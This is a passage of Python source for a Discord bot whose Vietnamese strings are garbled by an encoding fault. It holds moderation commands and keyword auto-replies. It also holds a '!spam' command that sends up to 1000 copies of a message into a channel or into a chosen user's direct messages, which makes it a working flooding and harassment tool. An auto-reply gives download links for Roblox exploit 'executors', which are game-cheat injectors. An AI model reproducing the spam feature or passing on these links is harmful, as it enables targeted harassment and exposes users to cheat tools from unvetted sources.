                    description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra tham s·ªë
            if len(args) < 2:
                embed = discord.Embed(
                    title="‚ùå Thi·∫øu tham s·ªë",
                    description="C√∫ ph√°p: `!spam <message> <quantity> [user_id]`",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            spam_message = args[0]
            
            try:
                quantity = int(args[1])
            except ValueError:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="Quantity ph·∫£i l√† s·ªë nguy√™n!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            user_id = args[2] if len(args) >= 3 else None
            
            # Ki·ªÉm tra gi·ªõi h·∫°n s·ªë l∆∞·ª£ng
            if quantity > 1000:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="S·ªë l∆∞·ª£ng tin nh·∫Øn t·ªëi ƒëa l√† 1000!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            if quantity <= 0:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="S·ªë l∆∞·ª£ng tin nh·∫Øn ph·∫£i l·ªõn h∆°n 0!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ph·∫£n h·ªìi ban ƒë·∫ßu
            embed = discord.Embed(
                title="‚è≥ ƒêang x·ª≠ l√Ω...",
                description=f"ƒêang g·ª≠i {quantity} tin nh·∫Øn...",
                color=discord.Color.orange()
            )
            processing_msg = await message.reply(embed=embed, mention_author=False)
            
            try:
                sent_count = 0
                
                # N·∫øu c√≥ user_id, g·ª≠i tin nh·∫Øn cho user
                if user_id:
                    try:
                        target_user = await bot.fetch_user(int(user_id))
                        for i in range(quantity):
                            try:
                                await target_user.send(f"{spam_message}")
                                sent_count += 1
                                await asyncio.sleep(0.5)  # Delay 0.5 gi√¢y gi·ªØa c√°c tin nh·∫Øn
                            except Exception as e:
                                print(f"L·ªói g·ª≠i tin nh·∫Øn cho user: {e}")
                        
                        # Th√¥ng b√°o th√†nh c√¥ng
                        embed = discord.Embed(
                            title="‚úÖ Ho√†n th√†nh",
                            description=f"ƒê√£ g·ª≠i {quantity} tin nh·∫Øn ƒë·∫øn {target_user.mention}",
                            color=discord.Color.green()
                        )
                        await processing_msg.edit(embed=embed)
                        
                    except ValueError:
                        embed = discord.Embed(
                            title="‚ùå L·ªói",
                            description="User ID kh√¥ng h·ª£p l·ªá!",
                            color=discord.Color.red()
                        )
                        await processing_msg.edit(embed=embed)
                    except discord.NotFound:
                        embed = discord.Embed(
                            title="‚ùå L·ªói",
                            description="Kh√¥ng t√¨m th·∫•y user!",
                            color=discord.Color.red()
                        )
                        await processing_msg.edit(embed=embed)
                    except discord.Forbidden:
                        embed = discord.Embed(
                            title="‚ùå L·ªói",
                            description="Kh√¥ng th·ªÉ g·ª≠i tin nh·∫Øn cho user n√†y!",
                            color=discord.Color.red()
                        )
                        await processing_msg.edit(embed=embed)
                
                # N·∫øu kh√¥ng c√≥ user_id, g·ª≠i ·ªü channel hi·ªán t·∫°i
                else:
                    for i in range(quantity):
                        try:
                            await message.channel.send(f"{spam_message}")
                            sent_count += 1
                            await asyncio.sleep(0.5)  # Delay 0.5 gi√¢y gi·ªØa c√°c tin nh·∫Øn
                        except Exception as e:
                            print(f"L·ªói g·ª≠i tin nh·∫Øn: {e}")
                    
                    # Th√¥ng b√°o th√†nh c√¥ng
                    embed = discord.Embed(
                        title="‚úÖ Ho√†n th√†nh",
                        description=f"ƒê√£ g·ª≠i {quantity} tin nh·∫Øn v√†o k√™nh",
                        color=discord.Color.green()
                    )
                    await processing_msg.edit(embed=embed)
                    
            except Exception as e:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                    color=discord.Color.red()
                )
                await processing_msg.edit(embed=embed)
        
        elif command == "say":
            # Ki·ªÉm tra quy·ªÅn
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra tham s·ªë
            if len(args) < 1:
                embed = discord.Embed(
                    title="‚ùå Thi·∫øu tham s·ªë",
                    description="C√∫ ph√°p: `!say <message>`",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            say_message = " ".join(args)
            
            try:
                # G·ª≠i tin nh·∫Øn
                await message.channel.send(say_message)
                
                # X√≥a tin nh·∫Øn l·ªánh c·ªßa user
                try:
                    await message.delete()
                except:
                    pass  # Kh√¥ng x√≥a ƒë∆∞·ª£c c≈©ng kh√¥ng sao
                
            except discord.Forbidden:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="Bot kh√¥ng c√≥ quy·ªÅn g·ª≠i tin nh·∫Øn trong k√™nh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
            except Exception as e:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)

        # X·ª≠ l√Ω l·ªánh ?bancmd
        elif command == "bancmd":
            # Ki·ªÉm tra quy·ªÅn admin
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra tham s·ªë
            if len(args) < 2:
                embed = discord.Embed(
                    title="‚ùå Thi·∫øu tham s·ªë",
                    description="C√∫ ph√°p: `!bancmd <user_id> <reason>`",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            user_id = args[0]
            reason = " ".join(args[1:])
            
            try:
                # Chuy·ªÉn ƒë·ªïi user_id sang integer
                target_user_id = int(user_id)
                
                # Ki·ªÉm tra xem c√≥ t·ª± c·∫•m ch√≠nh m√¨nh kh√¥ng
                if target_user_id == message.author.id:
                    embed = discord.Embed(
                        title="‚ùå L·ªói",
                        description="B·∫°n kh√¥ng th·ªÉ t·ª± c·∫•m ch√≠nh m√¨nh!",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=embed, mention_author=False)
                    return
                
                # Ki·ªÉm tra xem c√≥ c·∫•m admin kh√°c kh√¥ng
                if target_user_id in ALLOWED_USERS:
                    embed = discord.Embed(
                        title="‚ùå L·ªói",
                        description="B·∫°n kh√¥ng th·ªÉ c·∫•m m·ªôt admin kh√°c!",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=embed, mention_author=False)
                    return
                
                # Ki·ªÉm tra xem user ƒë√£ b·ªã c·∫•m ch∆∞a
                if is_user_banned(target_user_id):
                    embed = discord.Embed(
                        title="‚ùå L·ªói",
                        description="Ng∆∞·ªùi d√πng n√†y ƒë√£ b·ªã c·∫•m tr∆∞·ªõc ƒë√≥!",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=embed, mention_author=False)
                    return
                
                # L·∫•y th·ªùi gian hi·ªán t·∫°i
                current_time = get_utc7_time()
                time_str = current_time.strftime("%H:%M:%S %d/%m/%Y")
                
                # Th√™m v√†o danh s√°ch c·∫•m
                BANNED_USERS[target_user_id] = {
                    "reason": reason,
                    "banned_by": f"{message.author.name}#{message.author.discriminator}",
                    "banned_at": time_str
                }
                
                # LOG
                user = f"{message.author.name}#{message.author.discriminator}"
                guild_name = message.guild.name if message.guild else "Direct Message"
                log_message = log_command(user, f"?bancmd userid:{user_id} reason:{reason}", guild_name, "Text Command")
                
                # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
                await send_dm_notification(user, f"?bancmd userid:{user_id} reason:{reason}", guild_name, "Text Command")
                
                # Th√¥ng b√°o th√†nh c√¥ng
                embed = discord.Embed(
                    title="‚úÖ ƒê√£ c·∫•m ng∆∞·ªùi d√πng",
                    description=f"ƒê√£ c·∫•m ng∆∞·ªùi d√πng v·ªõi ID {user_id} s·ª≠ d·ª•ng bot.\n**L√Ω do:** {reason}",
                    color=discord.Color.green()
                )
                await message.reply(embed=embed, mention_author=False)
                
            except ValueError:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="User ID kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p ID ƒë√∫ng ƒë·ªãnh d·∫°ng s·ªë.",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
            except Exception as e:
                error_embed = discord.Embed(
                    title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
                    description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                    color=discord.Color.red()
                )
                await message.reply(embed=error_embed, mention_author=False)

        # X·ª≠ l√Ω l·ªánh ?unbancmd
        elif command == "unbancmd":
            # Ki·ªÉm tra quy·ªÅn admin
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra tham s·ªë
            if len(args) < 2:
                embed = discord.Embed(
                    title="‚ùå Thi·∫øu tham s·ªë",
                    description="C√∫ ph√°p: `!unbancmd <user_id> <reason>`",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            user_id = args[0]
            reason = " ".join(args[1:])
            
            try:
                # Chuy·ªÉn ƒë·ªïi user_id sang integer
                target_user_id = int(user_id)
                
                # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
                if not is_user_banned(target_user_id):
                    embed = discord.Embed(
                        title="‚ùå L·ªói",
                        description="Ng∆∞·ªùi d√πng n√†y kh√¥ng b·ªã c·∫•m!",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=embed, mention_author=False)
                    return
                
                # X√≥a kh·ªèi danh s√°ch c·∫•m
                del BANNED_USERS[target_user_id]
                
                # LOG
                user = f"{message.author.name}#{message.author.discriminator}"
                guild_name = message.guild.name if message.guild else "Direct Message"
                log_message = log_command(user, f"?unbancmd userid:{user_id} reason:{reason}", guild_name, "Text Command")
                
                # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
                await send_dm_notification(user, f"?unbancmd userid:{user_id} reason:{reason}", guild_name, "Text Command")
                
                # Th√¥ng b√°o th√†nh c√¥ng
                embed = discord.Embed(
                    title="‚úÖ ƒê√£ g·ª° c·∫•m ng∆∞·ªùi d√πng",
                    description=f"ƒê√£ g·ª° c·∫•m ng∆∞·ªùi d√πng v·ªõi ID {user_id}.\n**L√Ω do:** {reason}",
                    color=discord.Color.green()
                )
                await message.reply(embed=embed, mention_author=False)
                
            except ValueError:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="User ID kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p ID ƒë√∫ng ƒë·ªãnh d·∫°ng s·ªë.",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
            except Exception as e:
                error_embed = discord.Embed(
                    title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
                    description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                    color=discord.Color.red()
                )
                await message.reply(embed=error_embed, mention_author=False)

        # X·ª≠ l√Ω l·ªánh ?bancmdlist
        elif command == "bancmdlist":
            # Ki·ªÉm tra quy·ªÅn admin
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # LOG
            user = f"{message.author.name}#{message.author.discriminator}"
            guild_name = message.guild.name if message.guild else "Direct Message"
            log_message = log_command(user, "?bancmdlist", guild_name, "Text Command")
            
            # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
            await send_dm_notification(user, "?bancmdlist", guild_name, "Text Command")
            
            current_time = get_utc7_time()
            
            embed = discord.Embed(
                title="üî® Danh s√°ch ng∆∞·ªùi d√πng b·ªã c·∫•m",
                description=get_banned_users_table(),
                color=discord.Color.orange(),
                timestamp=current_time
            )
            
            embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
            embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
            embed.set_thumbnail(url=ICON_URL)
            
            await message.reply(embed=embed, mention_author=False)
        
        else:
            # L·ªánh kh√¥ng x√°c ƒë·ªãnh
            embed = discord.Embed(
                title="‚ùå L·ªánh kh√¥ng t·ªìn t·∫°i",
                description="S·ª≠ d·ª•ng `!help` ƒë·ªÉ xem danh s√°ch l·ªánh",
                color=discord.Color.red()
            )
            await message.reply(embed=embed, mention_author=False)
    
    # X·ª≠ l√Ω auto response
    elif any(keyword in message.content.lower() for keyword in ["client", "executor", "executors"]):
        embed = discord.Embed(
            title="ü§ñ Danh s√°ch Client",
            description=(
                "> # Android\n"
                "‚Ä¢ [Delta X](https://deltaexploits.gg/delta-executor-android)\n"
                "‚Ä¢ [Code X](https://codex.lol/android)\n"
                "‚Ä¢ [Arceus X Global](https://spdmteam.com/index?os=android)\n"
                "‚Ä¢ [Arceus X VNG](https://spdmteam.com/index?os=android_vng)\n"
                "‚Ä¢ [Krnl](https://krnl.cat/downloads)\n"
                "‚Ä¢ [Ronix VNG](https://ronixstudios.com/#/download?platform=vietnam)\n"
                "‚Ä¢ [Ronix](https://ronixstudios.com/#/download?platform=android)\n"
                "> # IOS\n"
                "‚Ä¢ [Delta X](https://deltaexploits.gg/delta-executor-ios)\n"
                "‚Ä¢ [Krnl](https://krnl.cat/downloads)\n"
                "‚Ä¢ [Arceus X](https://spdmteam.com/index?os=ios)\n"
                "‚Ä¢ [Code X](https://codex.lol/ios)\n"
                "> # Mac OS\n"
                " [Ronix](https://ronixstudios.com/#/download?platform=macos)\n"
                "> # Windows\n"
                "‚Ä¢ [Volcano](https://volcano.wtf)\n"
                "‚Ä¢ [Velocity](https://discord.gg/velocityide)\n"
                "‚Ä¢ [Swift](https://getswift.vip)\n"
                "C√°c client vng nh∆∞ delta th√¨ s·∫Ω c·∫≠p nh·∫≠t sau t·∫°i k√™nh client nh√©!"
            ),
            color=discord.Color.blue()
        )
        await message.reply(embed=embed, mention_author=False)
    
    elif "lu·∫≠t" in message.content.lower():
        embed = discord.Embed(
            title="‚öñÔ∏è Lu·∫≠t Server",
            description=(
                "**ƒê·ªÉ xem lu·∫≠t server, vui l√≤ng:**\n"
                "1. V√†o k√™nh <#1409785046075965460>\n"
                "2. ƒê·ªçc k·ªπ c√°c ƒëi·ªÅu kho·∫£n v√† quy ƒë·ªãnh\n"
                "3. Tu√¢n th·ªß lu·∫≠t ƒë·ªÉ tr√°nh b·ªã ban\n\n"
                "**üìå L∆∞u √Ω quan tr·ªçng:**\n"
                "‚Ä¢ Kh√¥ng spam, flood chat\n"
                "‚Ä¢ Kh√¥ng g√¢y war, toxic\n"
                "‚Ä¢ T√¥n tr·ªçng l·∫´n nhau v√† admin"
                "‚Ä¢ Kh√¥ng qu·∫£ng c√°o shop,server kh√°c khi ch∆∞a ƒë∆∞·ª£c ph√©p"
            ),
            color=discord.Color.gold()
        )
        await message.reply(embed=embed, mention_author=False)
    
    elif any(keyword in message.content.lower() for keyword in ["m√°y ·∫£o", "c√°ch nh·∫≠n m√°y ·∫£o"]):
        embed = discord.Embed(
            title="üñ•Ô∏è Nh·∫≠n M√°y ·∫¢o",
            description=(
                "**ƒê·ªÉ nh·∫≠n m√°y ·∫£o, vui l√≤ng:**\n"
                "1. V√†o k√™nh <#1409792064438403154>\n"
                "C√≥ 2 bot ƒë·ªÉ b·∫°n nh·∫≠n m√°y ·∫£o l√† hanami v√† king\n\n"
                "Hanami th√¨ b·∫°n nh·∫≠p l·ªánh `/gethcoin` v∆∞·ª£t link nh·∫≠n coin r·ªìi th√¨ nh·∫≠p l·ªánh "
                "`/getredfinger` ho·∫∑c m√°y ·∫£o m√† b·∫°n mu·ªën nh·∫≠n\n\n"
                "King th√¨ b·∫°n nh·∫≠p `/nhiemvu` ho·∫∑c `!nv` v∆∞·ª£t link nh·∫≠n ƒëi·ªÉm r nh·∫≠n m√°y ·∫£o th√¥i "
                "b·∫°n c√≥ th·ªÉ nh·∫≠p `/account` ƒë·ªÉ xem King c√≤n l·∫°i bao nhi√™u m√°y ·∫£o\n"
                "3. Enjoy:)\n\n"
                "**üìã Y√™u c·∫ßu:**\n"
                "‚Ä¢ Kh√¥ng l·∫°m d·ª•ng bot\n"
                "‚Ä¢ ƒê√£ ƒë·ªçc v√† ƒë·ªìng √Ω v·ªõi lu·∫≠t server\n"
                "‚Ä¢ Ch·ªâ d√πng bot t·∫°i k√™nh bot\n\n"
            ),
            color=discord.Color.green()
        )
        await message.reply(embed=embed, mention_author=False)
    
    # Ti·∫øp t·ª•c x·ª≠ l√Ω c√°c l·ªánh kh√°c
    await bot.process_commands(message)

# Ch·∫°y bot (TH√äM TOKEN C·ª¶A B·∫†N V√ÄO ƒê√ÇY)
if __name__ == "__main__":
    # L·∫•y token t·ª´ bi·∫øn m√¥i tr∆∞·ªùng
    token = os.getenv("DISCORD_BOT_TOKEN")  # n·∫øu kh√¥ng c√≥, s·∫Ω y√™u c·∫ßu input

    if not token:
        token = input(Fore.CYAN + "[Info]" + Fore.WHITE + " Vui l√≤ng nh·∫≠p token bot Discord: " + Style.RESET_ALL).strip()

    try:
        print(Fore.CYAN + "[Info]" + Fore.WHITE + " ƒêang kh·ªüi ƒë·ªông bot..." + Style.RESET_ALL)
        bot.run(token)
    except Exception as e:
        print(Fore.RED + f"[Error] L·ªói khi kh·ªüi ƒë·ªông bot: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "[Debug] Vui l√≤ng ki·ªÉm tra l·∫°i token v√† th·ª≠ l·∫°i." + Style.RESET_ALL)
